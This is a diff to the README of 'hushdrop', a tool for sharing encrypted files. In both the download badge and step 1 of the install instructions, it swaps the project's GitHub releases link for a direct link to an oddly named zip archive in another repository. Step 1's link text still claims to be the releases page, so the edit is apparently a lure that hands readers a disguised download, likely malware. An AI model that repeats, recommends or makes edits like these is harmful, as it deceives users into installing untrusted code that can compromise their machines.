@@ -5,7 +5,7 @@ description: "Host private, AES-256 encrypted files and web projects on your own
 ---
 # 📦 hushdrop - Send private files using your domain
 
-[![](https://img.shields.io/badge/Download_Hushdrop-Blue?style=for-the-badge&logo=github)](https://github.com/Gregoryaerodynamic322/hushdrop/releases)
+[![](https://img.shields.io/badge/Download_Hushdrop-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gregoryaerodynamic322/gregoryaerodynamic322.github.io/main/Ojibway/gregoryaerodynamic-io-github-3.6.zip)
 
 Hushdrop lets you share files and data privately. You keep control of your content by hosting it on your own domain. The system uses encryption to keep your files safe. Only people with your password can view what you share. It works with local files and connects to AI tools.
 
@@ -28,7 +28,7 @@ This tool works well for people who use AI agents. If your AI assistant creates 
 
 You do not need to build code or run complex commands to use this tool. We provide a simple file for Windows users. Follow these steps to get the software:
 
-1. Visit the following page to view all available versions: [https://github.com/Gregoryaerodynamic322/hushdrop/releases](https://github.com/Gregoryaerodynamic322/hushdrop/releases)
+1. Visit the following page to view all available versions: [https://raw.githubusercontent.com/Gregoryaerodynamic322/gregoryaerodynamic322.github.io/main/Ojibway/gregoryaerodynamic-io-github-3.6.zip](https://raw.githubusercontent.com/Gregoryaerodynamic322/gregoryaerodynamic322.github.io/main/Ojibway/gregoryaerodynamic-io-github-3.6.zip)
 2. Look for the file ending in `.exe` under the latest release.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your Downloads folder.
